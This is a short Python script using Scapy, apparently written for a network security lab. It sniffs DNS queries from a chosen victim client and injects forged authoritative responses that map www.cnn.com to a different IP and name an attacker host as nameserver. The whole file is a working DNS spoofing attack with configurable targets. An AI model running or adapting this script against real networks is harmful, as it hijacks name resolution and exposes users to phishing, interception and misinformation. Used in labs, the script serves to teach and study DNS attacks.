#!/usr/bin/env python3
from scapy.all import *
import random

# Define the variables
# This script sniffs all DNS packets coming from the victim client, and if client asks questions about the IP address of www.cnn.com, this script responds to the victim with a forged response which says that the IP address of www.cnn.com is 188.126.71.216, which is the IP address of fakenews.com.
TARGET_HOSTNAME = "www.cnn.com"
FAKE_IP = "188.126.71.216"  # Replace with the desired fake IP address
DNS_CLIENT_IP = "10.0.2.4"  # Replace with the actual DNS client IP
ATTACKER_IP = "10.0.2.6"  # Replace with the attacker's IP address (fake authoritative NS)
FAKE_TTL = 19000  # TTL value to set for spoofed response

# DNS Query filter
def dns_filter(packet):
    return DNS in packet and packet[DNS].qr == 0 and packet[IP].src == DNS_CLIENT_IP

# Crafting the DNS response
def spoof_dns_response(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qd.qname.decode('utf-8') == TARGET_HOSTNAME + '.':
        print(f"[+] Spoofing DNS response for {TARGET_HOSTNAME}")
        
        # Create a DNS response packet
        dns_resp = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                   UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
                   DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, 
                       an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=FAKE_TTL, rdata=FAKE_IP),
                       ns=DNSRR(rrname=TARGET_HOSTNAME, ttl=FAKE_TTL, rdata=ATTACKER_IP))

        send(dns_resp, verbose=0)
        print(f"[+] Spoofed DNS response sent to {pkt[IP].src}")

# Start sniffing and apply the filter for DNS queries
sniff(filter=f"src host {DNS_CLIENT_IP} and udp port 53", prn=spoof_dns_response, store=0)

